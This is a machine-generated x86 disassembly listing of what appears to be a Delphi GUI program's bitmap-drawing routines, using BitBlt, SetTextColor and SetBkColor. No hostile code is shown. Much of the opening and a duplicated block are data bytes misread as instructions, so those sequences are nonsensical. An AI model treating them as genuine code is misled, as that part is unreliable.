add [ eax ] al
add bh bh
int3
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ edx + 0x1 ] dh
add bh bh
add [ ecx ] ah
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
add ah ch
imul eax [ ecx ] 0xfe00003c
and al 0xef
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
cld
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
push r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
jo r-xdata
outsb
je r-xdata
[ eax + 0x43 ]
add bh bh
insb
and [ ebx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ esi ] al
dec esp
popad
jns r-xdata
add [ eax ] al
call eax
cli
inc ebx
add [ eax + 0x1c ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0xbc656c62
push edx
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
outsb
je r-xdata
add [ edx + 0x24ff0000 ] bl
std
jne r-xdata
add [ eax ] eax
inc esp
and [ ebx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
outsb
add al 0x0
add [ eax ] al
pop ds
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
0x24ff0000 0x43fd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
inc ebx
cmp al 0x10
inc eax
add [ ecx + eax ] bh
dec [ eax + 0x1004320 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc [ eax ]
std
inc ebx
add al cl
cld
dec ebp
outsd
jne r-xdata
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
les esp [ eax ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb865646f
out dx eax
inc esp
add [ eax + eax ] bh
[ eax - 0x5 ]
push esp
jb r-xdata
adc [ eax ] al
jne r-xdata
push 0x6948776f
outsb
je r-xdata
inc ebx
add [ eax - 0x24000000 ] cl
rol [ ebx ] 0x48
out dx al
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add ah ah
push es
inc ebx
add al ah
fadd [ eax + eax + 0x68 ]
fadd [ eax + eax + 0x20 ]
fadd [ eax + eax + 0x28 ]
jmp r-xdata
inc esp
outsd
ja r-xdata
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
insb
inc ebx
insb
outsb
je r-xdata
outsb
je r-xdata
imul ebp [ esi + 0x74 ] r-xdata
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
add [ eax ] al
and [ ebx ] 0x0
outsb
jae r-xdata
[ eax + 0x1004320 ]
add [ edi ] al
push ebx
jo r-xdata
add bh bh
test al 0x20
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ edi ] bl
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
mov esp 0x7004305
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
dec esp
stosd [ edi ]
inc ebx
add al bl
add [ eax ] al
adc [ eax ] al
push edi
add [ gs : esi ] 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x30004306 ] al
add [ eax ] al
add [ eax - 0x4bffbff0 ] dh
xor eax [ eax ]
shl [ ebx ] 0x40
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + ecx + 0x43 ] dl
add [ esp + edx * 2 ] cl
inc edx
jne r-xdata
push 0x7473694c
push 0x78004305
retn 0x43
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
jb r-xdata
outsb
inc edi
insb
jns r-xdata
dec [ ebx - 0x7f7c7410 ]
add [ eax ] al
add [ ebx ] bh
jo r-xdata
std
mov eax esi
call sub_44cab4
test bl bl
jle r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
xor edx edx
mov eax ebx
call sub_44cee8
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_41831c
jl r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_44ca60
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_4183c0
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_43022c
adc [ eax ] eax
add al 0x44
outsd
ja r-xdata
add [ esp + edi * 8 + 0x43 ] dh
add [ eax - 0x80000000 ] al
adc eax 0x6f460400
outsb
je r-xdata
sbb [ ecx - 0x44fffbd ] ch
inc ebx
add al ah
sti
inc ebx
add al ah
sbb eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070012 ] al
popad
jo r-xdata
add [ eax ] eax
or eax [ edx ]
xor [ edi ] bl
inc ebx
add [ edi + ebx ] bh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47050016 ] al
insb
jns r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push eax
add [ eax ] al
cld
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
push r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
jo r-xdata
outsb
je r-xdata
[ eax + 0x43 ]
add bh bh
insb
and [ ebx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ esi ] al
dec esp
popad
jns r-xdata
add [ eax ] al
call eax
cli
inc ebx
add [ eax + 0x1c ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0xbc656c62
push edx
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
outsb
je r-xdata
add [ edx + 0x24ff0000 ] bl
std
jne r-xdata
add [ eax ] eax
inc esp
and [ ebx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
outsb
add al 0x0
add [ eax ] al
pop ds
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
0x24ff0000 0x43fd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
inc ebx
cmp al 0x10
inc eax
add [ ecx + eax ] bh
dec [ eax + 0x1004320 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc [ eax ]
std
inc ebx
add al cl
cld
dec ebp
outsd
jne r-xdata
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
les esp [ eax ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb865646f
out dx eax
inc esp
add [ eax + eax ] bh
[ eax - 0x5 ]
push esp
jb r-xdata
adc [ eax ] al
jne r-xdata
push 0x6948776f
outsb
je r-xdata
inc ebx
add [ eax - 0x24000000 ] cl
rol [ ebx ] 0x48
out dx al
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add ah ah
push es
inc ebx
add al ah
fadd [ eax + eax + 0x68 ]
fadd [ eax + eax + 0x20 ]
fadd [ eax + eax + 0x28 ]
jmp r-xdata
inc esp
outsd
ja r-xdata
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
insb
inc ebx
insb
outsb
je r-xdata
outsb
je r-xdata
imul ebp [ esi + 0x74 ] r-xdata
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
add [ eax ] al
and [ ebx ] 0x0
outsb
jae r-xdata
[ eax + 0x1004320 ]
add [ edi ] al
push ebx
jo r-xdata
add bh bh
test al 0x20
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ edi ] bl
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
mov esp 0x7004305
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
dec esp
stosd [ edi ]
inc ebx
add al bl
add [ eax ] al
adc [ eax ] al
push edi
add [ gs : esi ] 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x30004306 ] al
add [ eax ] al
add [ eax - 0x4bffbff0 ] dh
xor eax [ eax ]
shl [ ebx ] 0x40
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + ecx + 0x43 ] dl
add [ esp + edx * 2 ] cl
inc edx
jne r-xdata
push 0x7473694c
push 0x78004305
retn 0x43
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
jb r-xdata
outsb
inc edi
insb
jns r-xdata
dec [ ebx - 0x7f7c7410 ]
add [ eax ] al
add [ ebx ] bh
jo r-xdata
std
mov eax esi
call sub_44cab4
test bl bl
jle r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
xor edx edx
mov eax ebx
call sub_44cee8
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_41831c
jl r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_44ca60
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_4183c0
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_430690
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_44ca60
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_430714
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_418404
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_4183c0
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_44cee8
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_41831c
sub_430760
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_430714
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_44d0f4
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43078c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_4183ec
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_4183c0
sub_4307bc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40313c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_430800
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_430830
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_430690
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_417d38
mov eax [ edi + 0x4 ]
mov edx esi
call sub_417e94
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_430890
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_418030
mov eax ebx
call sub_40316c
sub_4308c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_40313c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_4309f4
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_403490
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4307bc
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_430954
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40316c
mov eax esi
call sub_4309b0
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_4308b4
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
mov eax [ rw-data ]
call sub_40316c
xor eax eax
mov [ rw-data ] eax
sub_4309b0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_43078c
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_430890
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_4309f4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_426fb0
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_4309b0
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_430a24
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4309b0
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_426fb0
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_430a9c
mov eax 0x1
sub_430a9c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_4309b0
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_4309f4
sub_430ac4
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_431073
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_416a60
mov eax [ ebp - 0xc ]
call sub_426ec4
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4221f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_42668c
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_416a60
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_430830
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4307bc
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_426ec4
push eax
mov eax [ ebp - 0xc ]
call sub_426ec4
lea edx [ ebp - 0x28 ]
pop ecx
call sub_422468
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_430760
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_430760
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_431037
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40316c
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_426ec4
mov eax [ eax + 0x14 ]
xor edx edx
call sub_4221f8
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_426f80
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_426ec4
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_426ec4
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_422468
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_427c34
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_426ec4
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_4221f8
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_426ec4
push eax
mov eax [ ebp - 0x14 ]
call sub_426ec4
lea edx [ ebp - 0x28 ]
pop ecx
call sub_422468
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_4221f8
mov eax [ ebp - 0x18 ]
call sub_4229f0
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_426ec4
call sub_4229f0
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_426ec4
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_4221f8
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_426ec4
push eax
mov eax [ ebp - 0x14 ]
call sub_426ec4
lea edx [ ebp - 0x28 ]
pop ecx
call sub_422468
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_4221f8
mov eax [ ebp - 0x18 ]
call sub_4229f0
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_426ec4
call sub_4229f0
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42154c
push eax
mov eax [ ebp - 0x10 ]
call sub_426ec4
mov eax [ eax + 0x14 ]
pop edx
call sub_4221f8
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_426ec4
push eax
mov eax [ ebp - 0x14 ]
call sub_426ec4
lea edx [ ebp - 0x28 ]
pop ecx
call sub_422468
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4221f8
mov eax [ ebp - 0x18 ]
call sub_4229f0
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_426ec4
call sub_4229f0
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_427c34
mov eax [ ebp - 0xc ]
